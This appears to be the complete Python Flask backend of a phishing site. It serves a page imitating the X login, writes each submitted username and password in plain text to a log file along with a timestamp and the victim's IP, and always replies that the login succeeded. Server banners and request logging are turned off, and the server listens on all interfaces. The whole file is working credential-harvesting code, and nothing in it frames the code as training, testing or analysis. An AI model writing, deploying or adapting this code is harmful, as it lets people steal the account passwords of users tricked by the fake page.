from flask import Flask, render_template, request, jsonify
import os
import datetime
import flask.cli
import logging
flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)


app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

path = "X_Logins"
os.makedirs(path, exist_ok=True)
LOG_FILE = "logins.txt"
full_path = os.path.join(path, LOG_FILE)

if not os.path.exists(full_path):
    with open(full_path, "a", encoding="utf-8") as f:
        f.write("🔥 X Login Logs 🔥\n")
        f.write("=" * 50 + "\n\n")


@app.route('/')
def login_page():
    return render_template('X.html')

@app.route('/login', methods=['POST'])
def handle_login():
    try:
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.remote_addr

        with open(full_path, 'a', encoding='utf-8') as f:
            f.write(f"Time: {timestamp} | IP: {ip_address} | Username: {username} | Password: {password}\n")
            f.write("-" * 80 + "\n")

        print(f"✅ Information saved: {username} - IP: {ip_address}")

        return jsonify({
            'status': 'success',
            'message': 'Login successful'
        }), 200

    except Exception as e:
        print(f"❌ Error saving information: {e}")
        return jsonify({
            'status': 'error',
            'message': 'Internal server error'
        }), 500


def run():
    print("🚀 X Login Server is running...")
    print(f"📁 Save file location: {full_path}")
    print("🌐 Server address: http://localhost:5001")
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)


if __name__ == '__main__':
    run()